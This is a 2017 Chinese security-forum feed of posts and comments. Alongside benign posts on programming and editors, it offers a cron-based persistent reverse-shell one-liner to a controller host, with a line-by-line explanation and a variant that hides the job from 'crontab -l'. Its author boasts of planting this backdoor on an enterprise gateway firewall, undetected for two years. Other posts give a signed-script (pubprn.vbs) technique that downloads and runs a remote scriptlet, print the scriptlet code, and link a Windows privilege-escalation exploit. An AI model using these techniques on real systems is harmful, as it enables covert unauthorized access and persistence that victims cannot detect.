<img src="https://file.xiaomiquan.com/26/c1/26c15415a19d69cee1ba718742bf1da3d4e1cfc80f4ecd4cb8d5a7e2784ca0d3.jpg" width="25px"/> __lc__: 看着好棒棒！

<img src="https://file.xiaomiquan.com/1e/45/1e45fb090907fc37c7d0339b890816b01acc2f280b70468e9291613a7febe144.jpg" width="25px"/> __杰__: 新入手一台MBP，还不太熟，希望有详细的搭建环境文档分享一下😍


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-22:


__#经验#__

  有些同学不明白编程在安全中的意义，我特别说下吧。

编程在安全中的意义可以分为两大块来理解：

一. 

编程出来的对象有漏洞，如果我们要挖漏洞，肯定要精通目标对象的编程思想、逻辑思想或者说是设计思想、架构思想。有的漏洞是针对具体编程语言，有的是针对整体架构逻辑里的关系，比如业务操作、运维操作等。

知己知彼，你知道目标是如何编程出来的，如何架构运作的，还怕找不到漏洞？

比如挖 XSS 漏洞，如果不精通 JavaScript、不了解浏览器处理机制，绝对是挖不到好洞的。😄

再比如要挖 Web 后端漏洞，比如 Java 的，不精通 Java 机制、相关框架、中间件机制，你告诉我你如何挖到好洞？

二.

比如我精通 Python、JavaScript，我就能在手动挖洞方面自动化起来，还能在漏洞利用上写出相关工具。

就是这两大点。

编程是多少的关键。这也是我为什么说编程很强的人只要稍作引导，绝对可以成为一名“巨黑”。

下次谈谈学习各类编程语言的优势吧。喜欢的点赞。没互动，我不知道大家喜不喜欢。😏



...

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 不懂编程的安全人员，永远都是扫描器工程师..

<img src="https://file.xiaomiquan.com/59/46/59463c74099a7966bc6585d6104782f670abc10a7536be9c3f9dc22f49d361de.jpg" width="25px"/> __H3ro__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 😄

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 脚本编程吗还是c ?

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__: 巨黑😄

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: c不是脚本

<img src="https://file.xiaomiquan.com/94/4e/944e0e440befe227fc9fec9cfbbc1582ea0c3c1b68cdf361610450b96734c0cd.jpg" width="25px"/> __叶子__: 如果扫描器和利用写好的工具是一种找漏洞的姿势，那么直接看代代码，或者推测代码内部运行逻辑，从而找到漏洞点，这又是一种姿势。

<img src="https://file.xiaomiquan.com/45/79/4579de34e8ec11021f8b7bdfe0a39c2cd2548b177fe81fb27cc6b3ad1fb10d84.jpg" width="25px"/> __荣__: 喜欢。

<img src="https://file.xiaomiquan.com/17/1c/171c87fc22c8962abf10593ecbffe676b24ca95af8a9073951adb2fb18e4db9c.jpg" width="25px"/> __NashLing__: Ruby黑


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-22:


__#基础#__

  HTML 自定义元素教程


[HTML 自定义元素教程 - 阮一峰的网络日志](http://www.ruanyifeng.com/blog/2017/06/custom-elements.html)



可以了解到：

什么是自定义元素
HTML5/W3C/ES6
HTML Imports、HTML Template、Shadow DOM----统称为 Web Components 规范
React

了解 Web 当下利于我们研究安全。



...

<img src="https://file.xiaomiquan.com/e2/dc/e2dc9b5de68dd3589b802167b0e513c14680978ed2c834725b2d6a044207075e.jpg" width="25px"/> __忘却了年少__: 终于有点能看懂的东西了～～

<img src="https://file.xiaomiquan.com/54/9b/549b530952810268b8cfc01bff5bd09ebcaa4e0620daf8f9f559f393a21b214d.jpeg" width="25px"/> __赵龙__: 刚入圈，0基础，就从这里开始[色]


...

---

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ on 2017-06-22:


__#姿势#__

  一条命令实现无文件兼容性强的反弹后门,收集自强大的前乌云。
我觉得很实用且强大,分享给大家.

(crontab -l;echo '*/60 * * * * exec 9<> /dev/tcp/IP/port;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i')|crontab -


就是一条SHELL脚本，通过crontab 自定义一条定时执行的任务。


<详解>
/dev/tcp/IP/port  ：通过调用/dev/tcp 类似发出了一个socket的调用，建立一个socket连接，读写这个/dev/tcp就相当于在这个socket连接中传输数据，后面跟上你控制端的IP和端口，当然也可以写上你的域名，这样你植入后门后，你接收SHELL的服务器IP发生改变，你同样能收到SHELL。

exec 9<>  ：9是linux 中的文件描述符，0代表从键盘输入，1代表标准输出的，2代表错误输出的，这个大家都知道吧，其实一共有10个，只是其它的默认没有打开。exec 9<> ，意思是以读写方式打开/dev/tcp，然后所有的数据都会保留在9这个文件描述符内，并通过tcp连接在两端传输。

exec 0<&9  :意思是将9里面的内容传送给输入端，作用是当我们在控制端输入命令的时候，命令就自动传到被控端并被输入执行.

exec 1>9&  : 这个意思大家现在能明白了吧，就是被控端执行命令后的正确回显也输出到 9，这样我们在控制端就能接收到。

2>&1   :错误的输出也指向1，而前面1已经指向到了9，所以错误的消息也传向了9，这样我们就能在控制端收到正确和错误的回显了。

/bin/bash --noprofile -i  :这个就是调用bash来执行我们输入的命令，后面跟的参数是禁止执行一些登录shell时调用的脚本。


前面的时间设定很简单，大家不明白的可以百度下，我曾经植入一条这样的后门到一个大型企业的网关防火墙上（linux内核），每个月只连出来一次，2年了人家都没发现，当然可能管理员比较懒。拿到网关shell当然各种代理就都不是事了。

当然管理员通过crontab -l 可以查看到任务，

不过你这样：
(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/IP/PORT;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -  


猥琐版直接显示你用户名下没有任务....

在未连接状态启动反连任务的时候，进程和端口都无状态。



...

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: ****是什么

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 要不百度下crontab的用法？ 是设置时间用的，依次排序下去就是设置 分 时 日 月 周 ，*如果在日这个单位上，就是不限制在每月哪号。

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 了解了

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__: 6666   定时反弹shell这是，同时问下 linux想转发另外一台的3389出来，有什么好办法，用iptable做nat转发失败

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 参考下之前弦哥发的，ssh端口转发实战，应该可以解决你的问题。

<img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__: 赞一个 之前也研究过类似的问题 很想知道windows下面有没有类似的一句话命令

<img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__: 乌云太敏感，建议下次用其他关键词代替，避免被查水表。😂

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__: 有道理，谢谢提醒！

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__: 没事 提没事

<img src="https://file.xiaomiquan.com/31/56/3156e285d9e9e4cc076ba99da0f33a9a0a1571a7ab9aba0050dbcbf5dae54503.jpg" width="25px"/> __嘀嗒的钟__ replies to <img src="https://file.xiaomiquan.com/43/75/43758f94b2117e0c90d9296c788197e13dfbdc4697b0e9bf77554487bec2b3e7.jpg" width="25px"/> __。东__: 都这么久了 还敏感？

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 补充下：这个指令来自猪猪侠

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: 嗯，对，还有很多其它牛人奇淫技巧，精华找个时间遍历一遍。

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 下午在centos和kali上测试都显示9是Bad file descriptor

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 你没开监听就会这样，试着先开监听

<img src="https://file.xiaomiquan.com/3a/1d/3a1dfafee22fabee58800a8d92e40cb97cae002fa0245156de52e427a2631344.jpg" width="25px"/> __Leo__: kali里面直接在命令行里可以反弹拿到shell，但是在crontab里面无法拿shell，求解


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:


__#姿势#__

  CVE-2017-0213 Windows COM 特权提升漏洞组件，实战测试 WIN10 1703 完美通过，下载地址：


[Exploits/CVE-2017-0213 at master · WindowsExploits...](https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213)



演示视频：


[CVE-2017-0213-hackone的秒拍](http://m.miaopai.com/show/channel/dciBNvvRVHMhThOIlaqG9qogVpApkSJ3)



来自本圈@h4ck0ne  的实测及演示视频录制，提权神洞，推荐给大家。



...

<img src="https://file.xiaomiquan.com/38/9c/389c2cf556f50cb75c0a5ec3a988e7841dfec3eb2a19634628a74b60eaeaf870.jpg" width="25px"/> __Crushmyr__: 哇，今天货好多，得好好消化一下。

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 有毒

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 命令行下如何使用?执行了不行。

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 什么叫有毒

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__ replies to <img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__: nod32,360都杀掉了

<img src="https://file.xiaomiquan.com/0e/e1/0ee1c96d098d832f4c5b549d0174dc399280cfa71a743cd4397dd48e12b2e60a.jpg" width="25px"/> __灵活的胖子__ replies to <img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 😌😌

<img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 如果目标是域内的一台server，通过这个在本地把域账号添加到管理员组也适用么？

<img src="https://file.xiaomiquan.com/74/dd/74dd868df857e0ffec8613ae99f0891f0e7088f3533e8bd16f9614477984d3f6.jpg" width="25px"/> __‍迷途の狼__ replies to <img src="https://file.xiaomiquan.com/01/90/01903e0646f6df0fa017076ab2935b1104ade470b8eb8d28e3f2c3bb5b44e3d9.jpg" width="25px"/> __熟人不宜__: 不行


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:


__#姿势#__

  接上面那条 SCT 的白名单下载技巧，推上发现 @subTee  又扔出一个小技巧：

Hope your SCT detection is richer than looking for 
<scriptlet><registration>
Cause <package><component> works too 😀

代码在这：

[https://gist.github.com/subTee/7cec8af1ae9b9493731...](https://gist.github.com/subTee/7cec8af1ae9b9493731b8ec70e2cf034)

 

拷贝过来如下：

<?xml version="1.0"?>
<package>
  <comment>
    
  </comment>

  <component id="ABAPTest">
    <?component error="true" debug="true"?>

    <registration 
    progid="PoC"
    classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >

	<script >
		<![CDATA[

			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");	

		]]>
	</script>
</registration>

  </component>
</package>

也真只有吃透 Win，才能 hack 出更多独特玩法啊。



...

<img src="https://file.xiaomiquan.com/43/a9/43a9ca3b8048a6ac3b68c56a106eba321d9a13e2c5c61b440f7c7add0b668567.jpg" width="25px"/> __yiy__: 好难😆


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:


__#姿势#__

  给大家分享点具体渗透姿势，比如白名单下载恶意代码的一个技巧。

OPCDE 里看到的一个技巧：

cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs blah "script:
[https://gist.githubusercontent.com/enigma0x3/64adf...](https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct)



cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs blah "script:
[https://gist.githubusercontent.com/enigma0x3/64adf...](https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct)



简单说下：

第一个是英文的 Win10，第二个是中文的 Win10。test.sct 里的代码会弹个计算器。pubprn.vbs 是 Win 系统自带的，被签名过的。通过这种方式，可以 bypass 一些防御。pubprn.vbs 充当 downloader 角色。

中文，我自己实测的，据其他圈友测试 Win7/XP 都 OK。

test.sct代码如下：
<?XML version="1.0"?>
<scriptlet>

<registration
    description="Bandit"
    progid="Bandit"
    version="1.00"
    classid="{AAAA1111-0000-0000-0000-0000FEEDACDC}"
    remotable="true"
 >
</registration>

<script language="JScript">
<![CDATA[

  var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
 
 
]]>
</script>

</scriptlet>



---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-21:


__#资源#__

  2017年，Web 后端出现了哪些新的思想和技术？推荐这篇回答：


[2017年，Web 后端出现了哪些新的思想和技术？ - 知乎](https://www.zhihu.com/question/61085805/answer/186718190)

 

一位我一直觉得功力深厚的工程师好友。他这种底子如果想搞安全，那简直不敢想象的黑。😄

大家看他的回答，不懂的词汇可以自己搜索，算是了解下在优秀工程师眼里，Web 后端的门门道道吧，对我们搞安全的人来说，知己知彼，你懂得。



...

<img src="https://file.xiaomiquan.com/17/1c/171c87fc22c8962abf10593ecbffe676b24ca95af8a9073951adb2fb18e4db9c.jpg" width="25px"/> __NashLing__: 简直就是一匹黑马😄


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-20:

> 匿名用户 提问：
乌云现在怎么样了?还会回归吗？


不清楚，现在网络安全法也正式实施了，即使回归很多模式也得变革。



...

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 方小顿放了吗？

<img src="https://file.xiaomiquan.com/60/64/60640ca1fb2dfb0131ee8573a60ad8d86961495d76e4d6f025927ab4ce652fcb.jpg" width="25px"/> __国勇@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 我也想知道

<img src="https://file.xiaomiquan.com/08/5f/085fb0537ae32a57afd19df88c738810e85c9250a3ec4bff1352a84fa871536e.jpg" width="25px"/> __samurai__: 。。。。


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-20:

> 匿名用户 提问：
弦大，我想问一下，现在还有类似于乌云那样的网站么，国内国外都行


国外可以看 HackerOne，国内暂无此辉煌。



...

<img src="https://file.xiaomiquan.com/e5/95/e595f513a41c7340aa524a0b47d1673c3a698ffa32fa176df0886938c915d91f.jpg" width="25px"/> __Lion💬💬💬__: 需要翻墙么

<img src="https://file.xiaomiquan.com/1b/76/1b761d5e9f0688c3961321539f26c1e738f9644f5371637b10191d63761f4411.jpg" width="25px"/> __lw__ replies to <img src="https://file.xiaomiquan.com/e5/95/e595f513a41c7340aa524a0b47d1673c3a698ffa32fa176df0886938c915d91f.jpg" width="25px"/> __Lion💬💬💬__: 不用

<img src="https://file.xiaomiquan.com/e5/95/e595f513a41c7340aa524a0b47d1673c3a698ffa32fa176df0886938c915d91f.jpg" width="25px"/> __Lion💬💬💬__ replies to <img src="https://file.xiaomiquan.com/1b/76/1b761d5e9f0688c3961321539f26c1e738f9644f5371637b10191d63761f4411.jpg" width="25px"/> __lw__: 我这边确认需要

<img src="https://file.xiaomiquan.com/1b/76/1b761d5e9f0688c3961321539f26c1e738f9644f5371637b10191d63761f4411.jpg" width="25px"/> __lw__ replies to <img src="https://file.xiaomiquan.com/e5/95/e595f513a41c7340aa524a0b47d1673c3a698ffa32fa176df0886938c915d91f.jpg" width="25px"/> __Lion💬💬💬__: 呃 好吧 我用校园网试的，可以正常访问


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-20:


__#工具#__

 之前推荐了两次 Vim 及相关资源，大家上手如何，有同学希望推荐更多 Vim 相关的。如果对原生 Vim 不满意的，可以看看这个 SpaceVim：
[https://spacevim.org/](https://spacevim.org/)



官网介绍：

SpaceVim is a community-driven vim distribution that seeks to provide layer feature, especially for neovim. It offers a variety of layers to choose from. to create a suitable vim development environment, you just need to select the required layers.

这是社区驱动的，目的是打造一个不错的 VIM 开发环境。如图界面，感受下，确实很吊。

除了这个，还可以了解下 NeoVim。

但，我还是喜欢最原生的操作方式，说个奇葩的，如果是在 Windows 环境下，我的编程是直接用 Notepad++，对我来说，只要代码高亮好，其他都是小问题。但我最重要的开发环境还是在 Linux 下，用的是 Vim，不安装任何插件。

每个人的习惯不一样，SpaceVim 和 NeoVim，值得大家去了解看看，说不定你会一发不可收拾。

记住：无论搞安全还是编程，首先你得有自己的一款高效率编辑器环境。这个是玩出来的，多玩多折腾不会错！

<img src="https://images.xiaomiquan.com/FkoyCRgP9BeCL3uIw5qoSJNE6JIl?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:PhK0usi3xbyYBfTZbtOqsNASMWw=" width="50%" height="50%" align="middle"/>
<img src="https://images.xiaomiquan.com/FrcZwuYGx9kABFnN6FVAuKs-iBG6?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:7eyi2EK37A1GsCP7zn_BGfyqbLk=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/17/1c/171c87fc22c8962abf10593ecbffe676b24ca95af8a9073951adb2fb18e4db9c.jpg" width="25px"/> __NashLing__: Very Good!😁

<img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: 看了余弦表哥的推荐我深受感触，然后入了emacs坑

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/aa/a5/aaa5edc50f15df8cf529bd4360fedbfada616c8ebc63bd72efe67ba9773f4b02.jpg" width="25px"/> __踏歌行千山__: ……

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 最近在培训，之前vim那篇算是练了一些，感觉不错😜


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-20:

半夜问下：谁想成为本圈嘉宾的可以私信我。嘉宾义务：每周至少分享一条干货，促进本圈的发展。好处：成为我们这个虚拟团队成员，这个虚拟团队目前有 4 人，最终不会超过 10 人。😘



...

<img src="https://file.xiaomiquan.com/ef/57/ef5798735780f89acf08e04a16348776e8fc9b1fd447863dfd8bd44abb0d3b4c.jpg" width="25px"/> __慕风__: 有技术要求吗

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 这个好处没啥吸引力

<img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 建议拉一些爱分享的同志进圈

<img src="https://file.xiaomiquan.com/1a/5f/1a5f8f7eb15e881de0f992847b177425dd28eb7bb66248670dee1c671e277e68.jpg" width="25px"/> __Kitsch__: 刚看完公众号里面的关于我😂

<img src="https://file.xiaomiquan.com/cf/7f/cf7f43f7239631b851f38b8930349bafd8287ac9930c0996b2316197f5245971.jpg" width="25px"/> __breadjun__: 愿意分享，只怕能力不够😂

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/b4/60/b460e6ec9b8123ffccbe6825deec13b1b9f636a3925194d65240bb559366a436.jpg" width="25px"/> __Canng__: 然后？

<img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 这么好的机会，可惜天天忙成狗，妈的

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/da/93/da932bdb974c81065072be00f2453da6d3dd023dcafd78f6453e6b4be8b37487.jpg" width="25px"/> __ke@ATToT__: 都忙成狗，一样一样😄

<img src="https://file.xiaomiquan.com/c0/2f/c02f902dc8a3e47aca0835543c7d643ae0f26dd086da142f7e6c8fd8fc05d053.jpg" width="25px"/> __coder__: 😱😱小白有心无力

<img src="https://file.xiaomiquan.com/47/34/4734977baeba0c58ac33b1db56f9956e1a13ec8767bbb9f7a3c1c89943c67716.jpg" width="25px"/> __小菜鸟丶__: 分析的必须是技术性问题嘛😅

<img src="https://file.xiaomiquan.com/68/2a/682a5edf337126e5daa451f29386baec3828d89e3e390e9b864f5ac16d47368d.jpg" width="25px"/> __正义的地球人，举起你们的双手__: 我有时间，但是没干活·····

<img src="https://file.xiaomiquan.com/0a/77/0a779376ed0171ed1b0d4d32b04cfbd349dae7b0bd421f8194ceb0c753f0fcd1.jpg" width="25px"/> __测试测试__: 我来歪楼~~~推荐一个书 nmap 6 network exploration and security auditing cookbook😄😄😄

<img src="https://file.xiaomiquan.com/55/9c/559cd6ab0d53cede33572e8e5db8b7e82962f69e136838a2a81ae1ec04bf0859.jpg" width="25px"/> __右脸微笑__: 有心无力啊😂

<img src="https://file.xiaomiquan.com/55/9c/559cd6ab0d53cede33572e8e5db8b7e82962f69e136838a2a81ae1ec04bf0859.jpg" width="25px"/> __右脸微笑__ replies to <img src="https://file.xiaomiquan.com/0a/77/0a779376ed0171ed1b0d4d32b04cfbd349dae7b0bd421f8194ceb0c753f0fcd1.jpg" width="25px"/> __测试测试__: 👍🏻

<img src="https://file.xiaomiquan.com/97/47/974750d84f30b2b0bee06ac29107f8adbb3e028b3111605175e68bfa1ceadd35.jpg" width="25px"/> __hkurj__: 个人觉得 谁有好东西直接私信你 然后如果有用可以发布出来，给点劳务费什么的，这样集思广益更好点，毕竟这里大牛少


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-19:

很多人不明白什么是职业什么是业余，什么是兴趣什么是工作。

举个例子，黑客攻防，是我兴趣，也是工作，更成为了职业。而玩玩比特币、打打王者荣耀、吃吃小龙虾虽也是兴趣，但很业余，我不会通过这种方式去赚钱，能赚到也是投机罢了，如果能成大事，那也是投机，命运选中了我而已。

再往细了说，黑客攻防分支领域几十条，也仅某些条会是我的职业，而有不少仅仅是业余，如打 CTF、玩黑手等。

<img src="https://images.xiaomiquan.com/Fpsrz4Be8u7xLf9quR1dy665q23m?imageMogr2/auto-orient/thumbnail/800x/format/jpg/blur/1x0/quality/75&e=1843200000&token=kIxbL07-8jAj8w1n4s9zv64FuZZNEATmlU_Vm6zD:EOhjkxl5xYGR1TyuNDQ8Wua3ji4=" width="50%" height="50%" align="middle"/>


...

<img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 越来越感觉黑客的世界像是一个江湖

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ replies to <img src="https://file.xiaomiquan.com/e0/1d/e01d033928215404410d8a95fcd0868cc1cde3f31609eb54f6048cc674ef5baa.jpg" width="25px"/> __一休__: 有人的地方就有江湖，黑客世界并不特别

<img src="https://file.xiaomiquan.com/37/fd/37fd91e45e859e3ab99f01095032c9835770aa37886f6e0cb1bbe400f8f8424f.jpg" width="25px"/> __91__: 对，明白兴趣和职业的界限很重要。

<img src="https://file.xiaomiquan.com/8a/1a/8a1aae71dc17737ae012a9d160e13b985247ba9e86a37dcd5e169e4e2872e3dd.jpg" width="25px"/> __Apple__: 黑客攻防领域十几条分支包括哪些呢？


...

---

<img src="https://file.xiaomiquan.com/96/86/9686aeac0faa9aa0efc8cc53e1617273dd5e53e7a0425b9f06b68f806f03ca15.jpg" width="25px"/> __余弦@ATToT__ on 2017-06-19:


__#姿势#__

 Increased use of PowerShell in attacks

